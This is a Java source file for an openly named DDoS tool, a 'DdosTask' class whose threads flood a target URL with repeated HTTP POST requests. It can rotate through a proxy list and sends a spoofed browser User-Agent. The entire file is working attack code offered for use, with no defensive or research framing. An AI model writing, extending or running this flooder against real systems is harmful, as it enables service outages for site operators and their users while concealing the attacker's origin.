package ddosAttack;

import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Random;

public class DdosTask implements Runnable {

    private final Random random = new Random();

    private final URL targetUrl;

    private final int maxConnectionsPerThread;

    private final String params;

    public DdosTask(String targetUrl, int maxConnectionsPerThread) throws Exception {
        this.targetUrl = new URL(targetUrl);
        this.maxConnectionsPerThread = maxConnectionsPerThread;
        this.params = "param1=" + URLEncoder.encode("87845", "UTF-8");
    }

    @Override
    public void run() {
        for (int i = 0; i < maxConnectionsPerThread; i++) {
            try {
                attack();
                Thread.sleep(1000 / AttackConstants.ATTACK_RATE_PER_SECOND);
            } catch (Exception e) {
                System.err.println("Error during attack: " + e.getMessage());
            }
        }
    }

    private void attack() throws Exception {
        HttpURLConnection connection = createConnection();
        System.out.println(Thread.currentThread().getName() + ": " + connection.getResponseCode());
        connection.getInputStream().close();
    }

    private HttpURLConnection createConnection() throws Exception {
        HttpURLConnection connection;
        if (AttackConstants.PROXY_LIST.isEmpty()) {
            connection = (HttpURLConnection) targetUrl.openConnection();
        } else {
            String proxyAddress = AttackConstants.PROXY_LIST.get(random.nextInt(AttackConstants.PROXY_LIST.size()));
            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyAddress, 8080));
            connection = (HttpURLConnection) targetUrl.openConnection(proxy);
        }

        connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setUseCaches(false);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Charset", "utf-8");
        connection.setRequestProperty("Host", targetUrl.getHost());
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", String.valueOf(params.length()));
        connection.setRequestProperty("Connection", "Keep-Alive");
        connection.setConnectTimeout(AttackConstants.TIMEOUT_MS);
        connection.setReadTimeout(AttackConstants.TIMEOUT_MS);

        return connection;
    }
}
